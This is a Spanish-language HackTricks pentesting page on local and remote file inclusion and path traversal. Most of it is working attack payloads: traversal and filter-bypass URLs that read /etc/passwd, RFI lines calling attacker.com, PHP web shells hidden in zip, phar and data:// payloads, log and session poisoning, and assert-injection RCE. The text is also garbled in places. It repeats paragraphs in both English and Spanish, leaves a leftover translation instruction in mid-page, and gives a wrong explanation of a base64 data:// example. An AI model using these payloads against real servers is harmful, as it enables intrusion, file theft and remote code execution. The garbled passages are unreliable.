# Inclusi√≥n de archivos/Traves√≠a de ruta

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obt√©n el [**merchandising oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof es el hogar de todas las recompensas por errores de criptograf√≠a.**

**Obt√©n recompensas sin demoras**\
Las recompensas de HackenProof se lanzan solo cuando sus clientes depositan el presupuesto de recompensa. Obtendr√°s la recompensa despu√©s de que se verifique el error.

**Obt√©n experiencia en pentesting web3**\
¬°Los protocolos blockchain y los contratos inteligentes son el nuevo Internet! Domina la seguridad web3 en sus d√≠as de crecimiento.

**Convi√©rtete en la leyenda del hacker web3**\
Gana puntos de reputaci√≥n con cada error verificado y conquista la cima de la clasificaci√≥n semanal.

[**Reg√≠strate en HackenProof**](https://hackenproof.com/register) y comienza a ganar con tus hacks!

{% embed url="https://hackenproof.com/register" %}

## Inclusi√≥n de archivos

**Inclusi√≥n de archivos remotos (RFI):** El archivo se carga desde un servidor remoto (lo mejor: puedes escribir el c√≥digo y el servidor lo ejecutar√°). En php esto est√° **desactivado** de forma predeterminada (**allow\_url\_include**).\
**Inclusi√≥n de archivos locales (LFI):** El servidor carga un archivo local.

La vulnerabilidad ocurre cuando el usuario puede controlar de alguna manera el archivo que va a ser cargado por el servidor.

Funciones de PHP vulnerables: require, require\_once, include, include\_once

Una herramienta interesante para explotar esta vulnerabilidad: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Ciegos - Interesantes - Archivos LFI2RCE
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**Mezclando varias listas de LFI de \*nix y a√±adiendo m√°s rutas, he creado esta:**

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt" %}

Tambi√©n intenta cambiar `/` por `\`\
Tambi√©n intenta a√±adir `../../../../../`

Puedes encontrar una lista que utiliza varias t√©cnicas para encontrar el archivo /etc/password (para comprobar si existe la vulnerabilidad) [aqu√≠](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)

### **Windows**

Mezclando varias listas he creado esta:

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt" %}

Tambi√©n intenta cambiar `/` por `\`\
Tambi√©n intenta eliminar `C:/` y a√±adir `../../../../../`

Puedes encontrar una lista que utiliza varias t√©cnicas para encontrar el archivo /boot.ini (para comprobar si existe la vulnerabilidad) [aqu√≠](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt)

### **OS X**

Consulta la lista de LFI de Linux.

## LFI b√°sico y bypasses

Todos los ejemplos son para Local File Inclusion, pero tambi√©n se pueden aplicar a Remote File Inclusion (page=[http://myserver.com/phpshellcode.txt\\](http://myserver.com/phpshellcode.txt\)/).
```
http://example.com/index.php?page=../../../etc/passwd
```
### secuencias de recorrido sin recursi√≥n eliminadas

When performing a file inclusion vulnerability assessment, it is common to encounter web applications that strip traversal sequences in a non-recursive manner. This means that the application removes traversal sequences like "../" from the user input, but only does so once and does not repeat the process.

Cuando se realiza una evaluaci√≥n de vulnerabilidad de inclusi√≥n de archivos, es com√∫n encontrarse con aplicaciones web que eliminan las secuencias de recorrido de manera no recursiva. Esto significa que la aplicaci√≥n elimina las secuencias de recorrido como "../" de la entrada del usuario, pero solo lo hace una vez y no repite el proceso.

For example, if the user input contains "../" to traverse to a parent directory, the application will remove the "../" once and continue processing the remaining input. This can be a challenge for an attacker trying to exploit the file inclusion vulnerability.

Por ejemplo, si la entrada del usuario contiene "../" para recorrer un directorio padre, la aplicaci√≥n eliminar√° "../" una vez y continuar√° procesando la entrada restante. Esto puede ser un desaf√≠o para un atacante que intenta explotar la vulnerabilidad de inclusi√≥n de archivos.

To bypass this non-recursive stripping, an attacker can use alternative traversal sequences that are not stripped by the application. These alternative sequences can include URL encoding, double encoding, or using different characters to represent traversal.

Para evadir esta eliminaci√≥n no recursiva, un atacante puede utilizar secuencias de recorrido alternativas que no sean eliminadas por la aplicaci√≥n. Estas secuencias alternativas pueden incluir codificaci√≥n de URL, doble codificaci√≥n o el uso de diferentes caracteres para representar el recorrido.

By experimenting with different traversal sequences, an attacker can determine which ones are not stripped by the application and successfully exploit the file inclusion vulnerability.

Al experimentar con diferentes secuencias de recorrido, un atacante puede determinar cu√°les no son eliminadas por la aplicaci√≥n y explotar con √©xito la vulnerabilidad de inclusi√≥n de archivos.
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Null byte (%00)**

Bypass para agregar m√°s caracteres al final de la cadena proporcionada (bypass de: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
Este problema **se resolvi√≥ desde PHP 5.4**

### **Codificaci√≥n**

Podr√≠as usar codificaciones no est√°ndar como la codificaci√≥n de doble URL (y otras):
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### Desde la carpeta existente

Tal vez el back-end est√° verificando la ruta de la carpeta:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### Identificaci√≥n de carpetas en un servidor

Dependiendo del c√≥digo aplicativo / caracteres permitidos, es posible explorar de forma recursiva el sistema de archivos descubriendo carpetas y no solo archivos. Para hacerlo:

* identifica la "profundidad" de tu directorio actual al recuperar exitosamente `/etc/passwd` (si est√°s en Linux):
```
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
* Intenta adivinar el nombre de una carpeta en el directorio actual agregando el nombre de la carpeta (aqu√≠, `private`), y luego regresando a `/etc/passwd`:
```
http://example.com/index.php?page=private/../../../../etc/passwd # we went deeper down one level, so we have to go 3+1=4 levels up to go back to /etc/passwd
```
* si la aplicaci√≥n es vulnerable, puede haber dos resultados diferentes para la solicitud:
* si obtienes un error / sin salida, la carpeta `private` no existe en esta ubicaci√≥n
* si obtienes el contenido de `/etc/passwd`, has validado que hay una carpeta `private` en tu directorio actual
* las carpetas que descubras utilizando estas t√©cnicas pueden ser probadas para archivos (usando un m√©todo cl√°sico de LFI) o para subdirectorios utilizando la misma t√©cnica de forma recursiva.

Es posible adaptar esta t√©cnica para encontrar directorios en cualquier ubicaci√≥n del sistema de archivos. Por ejemplo, si, bajo la misma hip√≥tesis (directorio actual a una profundidad de 3 en el sistema de archivos), quieres verificar si `/var/www/` contiene un directorio `private`, utiliza la siguiente carga √∫til:
```
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
La siguiente secuencia de comandos permite generar payloads utilizando `sed` (1) como entrada para herramientas de fuzzing de URL como `ffuf` (2):
```
$ sed 's_^_../../../var/www/_g' /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt | sed 's_$_/../../../etc/passwd_g' > payloads.txt
$ ffuf -u http://example.com/index.php?page=FUZZ -w payloads.txt -mr "root"
```
Por supuesto, adapta los payloads a tus necesidades en t√©rminos de profundidad / ubicaci√≥n / lista de directorios de entrada.

### **Truncamiento de ruta**

Bypass de la adici√≥n de m√°s caracteres al final de la cadena proporcionada (bypass de: $\_GET\['param']."php")
```
In PHP: /etc/passwd = /etc//passwd = /etc/./passwd = /etc/passwd/ = /etc/passwd/.
Check if last 6 chars are passwd --> passwd/
Check if last 4 chars are ".php" --> shellcode.php/.
```

```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd..\.\.\.\.\.\.\.\.\.\.\[ADD MORE]\.\.
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.

#With the next options, by trial and error, you have to discover how many "../" are needed to delete the appended string but not "/etc/passwd" (near 2027)

http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
Siempre intenta **comenzar** la ruta **con un directorio falso** (a/).

**Esta vulnerabilidad fue corregida en PHP 5.3.**

### **Trucos para evadir filtros**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
```
## RFI B√°sico

El RFI (Inclusi√≥n de Archivos Remotos) es una vulnerabilidad com√∫n en aplicaciones web que permite a un atacante incluir archivos remotos en el c√≥digo fuente de una p√°gina web. Esto puede conducir a la ejecuci√≥n de c√≥digo arbitrario y comprometer la seguridad del sistema.

### C√≥mo funciona

El RFI se produce cuando una aplicaci√≥n web no valida adecuadamente las entradas del usuario antes de incluir archivos remotos. Esto permite que un atacante especifique una URL remota que contiene c√≥digo malicioso, que luego se ejecuta en el servidor web.

El RFI se puede explotar de varias maneras, pero una de las m√°s comunes es a trav√©s de par√°metros de URL. Por ejemplo, si una aplicaci√≥n web incluye un archivo PHP utilizando el valor de un par√°metro de URL sin validar, un atacante puede proporcionar una URL remota que contiene c√≥digo PHP malicioso. Cuando la aplicaci√≥n web incluye el archivo remoto, el c√≥digo malicioso se ejecuta en el servidor.

### Ejemplo de explotaci√≥n

Supongamos que una aplicaci√≥n web tiene una p√°gina que incluye un archivo PHP utilizando un par√°metro de URL llamado "archivo". El c√≥digo de la p√°gina podr√≠a verse as√≠:

```php
<?php
$archivo = $_GET['archivo'];
include($archivo);
?>
```

Un atacante podr√≠a explotar esta vulnerabilidad proporcionando una URL remota que contiene c√≥digo malicioso. Por ejemplo:

```
http://www.ejemplo.com/pagina.php?archivo=http://www.atacante.com/archivo_malicioso.php
```

Cuando la aplicaci√≥n web incluye el archivo remoto, el c√≥digo malicioso en "archivo_malicioso.php" se ejecuta en el servidor, lo que puede permitir al atacante realizar acciones no autorizadas.

### C√≥mo prevenir el RFI

Para prevenir el RFI, es importante validar y filtrar adecuadamente todas las entradas del usuario antes de incluir archivos remotos. Esto puede incluir la verificaci√≥n de la URL para asegurarse de que solo se incluyan archivos desde ubicaciones confiables y la implementaci√≥n de listas blancas de archivos permitidos.

Adem√°s, es recomendable deshabilitar la funci√≥n de inclusi√≥n de archivos remotos en la configuraci√≥n del servidor web, si no es necesaria para el funcionamiento de la aplicaci√≥n.

### Conclusi√≥n

El RFI es una vulnerabilidad com√∫n en aplicaciones web que puede permitir a los atacantes ejecutar c√≥digo arbitrario en un servidor. Al validar y filtrar adecuadamente las entradas del usuario y deshabilitar la inclusi√≥n de archivos remotos innecesarios, se puede prevenir esta vulnerabilidad y proteger la seguridad del sistema.
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
## Elemento ra√≠z de Python

En Python, en un c√≥digo como este:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
Si el usuario pasa una **ruta absoluta** a **`file_name`**, la **ruta anterior simplemente se elimina**:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
Es el comportamiento previsto seg√∫n [la documentaci√≥n](https://docs.python.org/3.10/library/os.path.html#os.path.join):

> Si un componente es una ruta absoluta, todos los componentes anteriores se descartan y la uni√≥n contin√∫a desde el componente de ruta absoluta.

## Listado de directorios en Java

Parece que si tienes una Traves√≠a de Ruta en Java y **solicitas un directorio** en lugar de un archivo, se devuelve un **listado del directorio**. Esto no ocurre en otros lenguajes (que yo sepa).

## Los 25 principales par√°metros

Aqu√≠ est√° la lista de los 25 principales par√°metros que podr√≠an ser vulnerables a vulnerabilidades de inclusi√≥n de archivos locales (LFI) (de [enlace](https://twitter.com/trbughunters/status/1279768631845494787)):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI utilizando envoltorios y protocolos PHP

### php://filter

Los filtros de PHP permiten realizar operaciones b√°sicas de modificaci√≥n en los datos antes de ser le√≠dos o escritos. Hay 5 categor√≠as de filtros:

* [Filtros de cadena](https://www.php.net/manual/en/filters.string.php):
* `string.rot13`
* `string.toupper`
* `string.tolower`
* `string.strip_tags`: Elimina las etiquetas de los datos (todo lo que est√° entre los caracteres "<" y ">")
* Ten en cuenta que este filtro ha desaparecido de las versiones modernas de PHP
* [Filtros de conversi√≥n](https://www.php.net/manual/en/filters.convert.php)
* `convert.base64-encode`
* `convert.base64-decode`
* `convert.quoted-printable-encode`
* `convert.quoted-printable-decode`
* `convert.iconv.*`: Transforma a una codificaci√≥n diferente (`convert.iconv.<input_enc>.<output_enc>`). Para obtener la **lista de todas las codificaciones** admitidas, ejecuta en la consola: `iconv -l`

{% hint style="warning" %}
Abusando del filtro de conversi√≥n `convert.iconv.*`, puedes **generar texto arbitrario**, lo cual podr√≠a ser √∫til para escribir texto arbitrario o hacer que una funci√≥n como include procese texto arbitrario. Para obtener m√°s informaci√≥n, consulta [**LFI2RCE a trav√©s de los filtros de PHP**](lfi2rce-via-php-filters.md).
{% endhint %}

* [Filtros de compresi√≥n](https://www.php.net/manual/en/filters.compression.php)
* `zlib.deflate`: Comprime el contenido (√∫til si se exfiltra mucha informaci√≥n)
* `zlib.inflate`: Descomprime los datos
* [Filtros de encriptaci√≥n](https://www.php.net/manual/en/filters.encryption.php)
* `mcrypt.*`: Obsoleto
* `mdecrypt.*`: Obsoleto
* Otros filtros
* Ejecutando en PHP `var_dump(stream_get_filters());`, puedes encontrar un par de filtros **inesperados**:
* `consumed`
* `dechunk`: invierte la codificaci√≥n chunked de HTTP
* `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,¬£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
```
{% hint style="warning" %}
La parte "php://filter" no distingue entre may√∫sculas y min√∫sculas.
{% endhint %}

### php://fd

Este envoltorio permite acceder a los descriptores de archivo que el proceso tiene abierto. Potencialmente √∫til para extraer el contenido de archivos abiertos:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
Tambi√©n puedes usar **php://stdin, php://stdout y php://stderr** para acceder a los **descriptores de archivo 0, 1 y 2** respectivamente (no estoy seguro de c√≥mo esto podr√≠a ser √∫til en un ataque)

### zip:// y rar://

Sube un archivo Zip o Rar con un PHPShell adentro y accede a √©l.\
Para poder abusar del protocolo rar, **necesita estar activado espec√≠ficamente**.
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://

La t√©cnica de inclusi√≥n de archivos es una vulnerabilidad com√∫n en las aplicaciones web que permite a un atacante incluir archivos arbitrarios en una p√°gina web. Esto puede conducir a la ejecuci√≥n remota de c√≥digo, revelaci√≥n de informaci√≥n confidencial o incluso a la toma completa del sistema.

La vulnerabilidad de inclusi√≥n de archivos se produce cuando una aplicaci√≥n web permite al usuario incluir archivos externos sin una validaci√≥n adecuada. Esto puede ocurrir cuando la aplicaci√≥n utiliza entradas del usuario para construir rutas de archivo o cuando se permite la inclusi√≥n de archivos a trav√©s de par√°metros de URL.

Un ejemplo com√∫n de esta vulnerabilidad es la inclusi√≥n de archivos locales utilizando el esquema "data://". Este esquema permite a un atacante incluir archivos locales en una p√°gina web utilizando una URL especial. Por ejemplo, el atacante podr√≠a utilizar la siguiente URL para incluir el archivo "/etc/passwd" en una p√°gina web:

```
data://text/plain;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8gV29ybGQhIik8L3NjcmlwdD4=
```

En este ejemplo, el archivo "/etc/passwd" se codifica en base64 y se incluye en la p√°gina web utilizando el esquema "data://". Cuando la p√°gina web se carga en el navegador, el archivo se decodifica y se muestra como texto en la p√°gina.

Es importante tener en cuenta que la inclusi√≥n de archivos locales utilizando el esquema "data://" puede ser peligrosa, ya que permite a un atacante acceder a archivos sensibles en el servidor. Por lo tanto, es crucial que los desarrolladores implementen medidas de seguridad adecuadas para prevenir esta vulnerabilidad, como la validaci√≥n de las entradas del usuario y la restricci√≥n de los archivos que se pueden incluir.
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
Hecho divertido: puedes desencadenar un XSS y evitar el Auditor de Chrome con: `http://example.com/index.php?page=data:application/x-httpd-php;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+`

Ten en cuenta que este protocolo est√° restringido por las configuraciones de php **`allow_url_open`** y **`allow_url_include`**

### expect://

Expect debe estar activado. Puedes ejecutar c√≥digo utilizando esto.
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

Especifica tu carga √∫til en los par√°metros POST
```
http://example.com/index.php?page=php://input
POST DATA: <?php system('id'); ?>
```
### phar://

Un archivo `.phar` tambi√©n se puede utilizar para ejecutar c√≥digo PHP si el sitio web est√° utilizando alguna funci√≥n como `include` para cargar el archivo.

{% code title="create_phar.php" %}
```python
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');

$phar->stopBuffering();
```
{% endcode %}

Y puedes compilar el `phar` ejecutando la siguiente l√≠nea:
```bash
php --define phar.readonly=0 create_path.php
```
Se generar√° un archivo llamado `test.phar` que puedes usar para abusar de la LFI.

Si la LFI solo lee el archivo y no ejecuta el c√≥digo PHP dentro de √©l, por ejemplo, utilizando funciones como _**file\_get\_contents(), fopen(), file() o file\_exists(), md5\_file(), filemtime() o filesize()**_**.** Puedes intentar abusar de una **deserializaci√≥n** que ocurre al **leer** un **archivo** utilizando el protocolo **phar**.\
Para obtener m√°s informaci√≥n, lee el siguiente art√≠culo:

{% content-ref url="phar-deserialization.md" %}
[phar-deserialization.md](phar-deserialization.md)
{% endcontent-ref %}

### M√°s protocolos

Consulta m√°s [**protocolos para incluir aqu√≠**](https://www.php.net/manual/en/wrappers.php)**:**

* [php://memory y php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) ‚Äî Escribir en memoria o en un archivo temporal (no estoy seguro de c√≥mo esto puede ser √∫til en un ataque de inclusi√≥n de archivos)
* [file://](https://www.php.net/manual/en/wrappers.file.php) ‚Äî Acceder al sistema de archivos local
* [http://](https://www.php.net/manual/en/wrappers.http.php) ‚Äî Acceder a URL HTTP(s)
* [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) ‚Äî Acceder a URL FTP(s)
* [zlib://](https://www.php.net/manual/en/wrappers.compression.php) ‚Äî Flujos de compresi√≥n
* [glob://](https://www.php.net/manual/en/wrappers.glob.php) ‚Äî Encontrar nombres de ruta que coincidan con un patr√≥n (no devuelve nada imprimible, por lo que no es realmente √∫til aqu√≠)
* [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) ‚Äî Secure Shell 2
* [ogg://](https://www.php.net/manual/en/wrappers.audio.php) ‚Äî Flujos de audio (no √∫til para leer archivos arbitrarios)

## LFI a trav√©s de 'assert' en PHP

Si te encuentras con una LFI dif√≠cil que parece filtrar cadenas de traves√≠a como ".." y responde con algo como "Intento de hackeo" o "Buen intento!", es posible que funcione una carga √∫til de inyecci√≥n de 'assert'.

Una carga √∫til como esta:
```
' and die(show_source('/etc/passwd')) or '
```
El siguiente contenido es de un libro de hacking sobre t√©cnicas de hacking. El siguiente contenido es del archivo pentesting-web/file-inclusion/README.md. Traduzca el texto relevante al espa√±ol y devuelva la traducci√≥n manteniendo exactamente la misma sintaxis de markdown y html. No traduzca cosas como c√≥digo, nombres de t√©cnicas de hacking, palabras de hacking, nombres de plataformas en la nube/SaaS (como Workspace, aws, gcp...), la palabra 'leak', pentesting y etiquetas de markdown. Tampoco agregue nada aparte de la traducci√≥n y la sintaxis de markdown.
```bash
assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");
```
Tambi√©n es posible obtener RCE en una declaraci√≥n "assert" vulnerable utilizando la funci√≥n system():
```
' and die(system("whoami")) or '
```
Aseg√∫rate de codificar las cargas √∫tiles en formato URL antes de enviarlas.

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof es el hogar de todas las recompensas por errores de criptograf√≠a.**

**Obt√©n recompensas sin demoras**\
Las recompensas de HackenProof se lanzan solo cuando sus clientes depositan el presupuesto de recompensa. Obtendr√°s la recompensa despu√©s de que se verifique el error.

**Obt√©n experiencia en pentesting web3**\
¬°Los protocolos de blockchain y los contratos inteligentes son el nuevo Internet! Domina la seguridad web3 en sus d√≠as de crecimiento.

**Convi√©rtete en la leyenda del hacker web3**\
Gana puntos de reputaci√≥n con cada error verificado y conquista la cima de la clasificaci√≥n semanal.

[**Reg√≠strate en HackenProof**](https://hackenproof.com/register) ¬°comienza a ganar con tus hacks!

{% embed url="https://hackenproof.com/register" %}

## Traversal de ruta ciega en PHP

{% hint style="warning" %}
Esta t√©cnica es relevante en casos en los que **controlas** la **ruta del archivo** de una **funci√≥n PHP** que acceder√° a un archivo pero no ver√°s el contenido del archivo (como una simple llamada a **`file()`**) pero el contenido no se muestra.
{% endhint %}

En [**esta incre√≠ble publicaci√≥n**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) se explica c√≥mo se puede abusar de la traversi√≥n de ruta ciega a trav√©s de un filtro PHP para **filtrar el contenido de un archivo a trav√©s de un or√°culo de error**.

En resumen, la t√©cnica utiliza la codificaci√≥n **"UCS-4LE"** para hacer que el contenido de un archivo sea tan **grande** que la **funci√≥n PHP que abre** el archivo desencadenar√° un **error**.

Luego, para filtrar el primer car√°cter, se utiliza el filtro **`dechunk`** junto con otros como **base64** o **rot13** y finalmente se utilizan los filtros **convert.iconv.UCS-4.UCS-4LE** y **convert.iconv.UTF16.UTF-16BE** para **colocar otros caracteres al principio y filtrarlos**.

**Funciones que podr√≠an ser vulnerables**: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (solo objetivo de solo lectura con esto)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

¬°Consulta la publicaci√≥n mencionada para obtener los detalles t√©cnicos!

## LFI2RCE

### RFI b√°sico
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
### A trav√©s del archivo de registro de Apache/Nginx

Si el servidor Apache o Nginx es **vulnerable a LFI** dentro de la funci√≥n include, puedes intentar acceder a **`/var/log/apache2/access.log` o `/var/log/nginx/access.log`**, establecer dentro del **agente de usuario** o dentro de un **par√°metro GET** una shell de PHP como **`<?php system($_GET['c']); ?>`** e incluir ese archivo.

{% hint style="warning" %}
Ten en cuenta que **si usas comillas dobles** para la shell en lugar de **comillas simples**, las comillas dobles se modificar√°n por la cadena "_**quote;**_", **PHP lanzar√° un error** y **no se ejecutar√° nada m√°s**.

Adem√°s, aseg√∫rate de **escribir correctamente la carga √∫til** o PHP lanzar√° un error cada vez que intente cargar el archivo de registro y no tendr√°s una segunda oportunidad.
{% endhint %}

Esto tambi√©n se puede hacer en otros registros, pero **ten cuidado**, el c√≥digo dentro de los registros podr√≠a estar codificado en URL y esto podr√≠a destruir la Shell. El encabezado **authorisation "basic"** contiene "usuario:contrase√±a" en Base64 y se decodifica dentro de los registros. La PHPShell podr√≠a insertarse dentro de este encabezado.\
Otros posibles caminos de registro:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Lista de palabras para fuzzing: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### A trav√©s de correo electr√≥nico

**Env√≠a un correo** a una cuenta interna (user@localhost) que contenga tu carga √∫til PHP como `<?php echo system($_REQUEST["cmd"]); ?>` e intenta incluirlo en el correo del usuario con una ruta como **`/var/mail/<NOMBRE_DE_USUARIO>`** o **`/var/spool/mail/<NOMBRE_DE_USUARIO>`**

### A trav√©s de /proc/\*/fd/\*

1. Sube muchas shells (por ejemplo: 100)
2. Incluye [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD), donde $PID es el ID del proceso (puede ser forzado por fuerza bruta) y $FD es el descriptor de archivo (tambi√©n puede ser forzado por fuerza bruta)

### A trav√©s de /proc/self/environ

Como un archivo de registro, env√≠a la carga √∫til en el User-Agent, se reflejar√° dentro del archivo /proc/self/environ
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### A trav√©s de carga

Si puedes cargar un archivo, simplemente inyecta la carga √∫til de la shell en √©l (por ejemplo: `<?php system($_GET['c']); ?>`).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
Para mantener el archivo legible, es mejor inyectar en los metadatos de las im√°genes/doc/pdf.

### A trav√©s de la carga de archivos ZIP

Cargue un archivo ZIP que contenga una shell PHP comprimida y acceda a ella:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### A trav√©s de sesiones PHP

Verifique si el sitio web utiliza sesiones PHP (PHPSESSID)
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
En PHP, estas sesiones se almacenan en archivos `_/var/lib/php5/sess\_[PHPSESSID]_`
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
